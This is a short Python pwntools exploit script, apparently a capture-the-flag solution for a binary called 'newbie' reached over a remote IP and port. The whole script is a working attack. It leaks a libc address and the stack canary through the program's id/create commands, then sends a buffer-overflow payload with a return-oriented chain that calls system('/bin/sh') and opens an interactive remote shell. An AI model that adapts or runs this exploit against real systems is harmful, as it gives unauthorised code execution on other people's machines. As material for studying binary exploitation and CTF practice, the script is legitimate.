from pwn import *
import os

f = open('./keys.txt', 'r')

keys = {}

for i in f.read().split():
	keys[i.split(':')[1]] = int(i.split(':')[0])

#io  = process('./newbie')
io = remote('18.191.117.63', 31337)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def leak(a, b):
	leakage = b''
	for i in range(a, b):
		print(io.recvuntil(b'> '))
		io.sendline(b'id '+ str(i).encode('utf-8'))
		print(io.recvuntil(b'> '))
		io.sendline(b'create')
		print(io.recvuntil(b'Your key: '))
		leakage += p16(keys[io.recvline().split()[0].decode('utf-8')])
	return leakage

libc.address = u64(leak(73, 76)+b'\0\0') - 0x21bf7

canary = leak(49, 53)

log.info("Canary: "+ hex(u64(canary)))
log.info("Libc: "+hex(libc.address))

payload = b'quit' + b'A'*84 + canary + b'AAAAAAAA' + p64(libc.address+0x3fa18) + p64(libc.address+0x215bf) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
print(io.recvuntil(b'> '))
io.sendline(payload)
io.interactive()